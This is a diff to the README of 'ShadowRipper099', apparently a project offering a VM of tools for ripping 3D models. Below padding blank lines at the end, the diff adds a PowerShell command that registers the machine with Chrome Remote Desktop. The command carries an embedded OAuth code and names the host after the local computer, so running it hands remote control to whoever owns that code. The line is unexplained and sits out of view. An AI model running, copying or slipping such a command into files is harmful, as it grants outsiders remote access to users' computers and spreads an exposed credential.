@@ -1,3 +1,4 @@
+
 # ShadowRipper099
 **A VM with pre-installed required tools for ripping 3d models etc. on Android/Mac/Windows/Linux**
 
@@ -28,3 +29,7 @@ Or Contact for help**
 **The Wizard 99 [YouTube Channel](https://youtube.com/@thewizard99)**
 
 # ❤️ Subscribe ❤️ 
+
+
+
+& "${Env:PROGRAMFILES(X86)}\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="4/0AQSTgQGravCQQEUmy34tsczp11y7FbiglbBASTIuq7hvAY2a-4bA3QUxb9CncTbgXOrKAw" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$Env:COMPUTERNAME
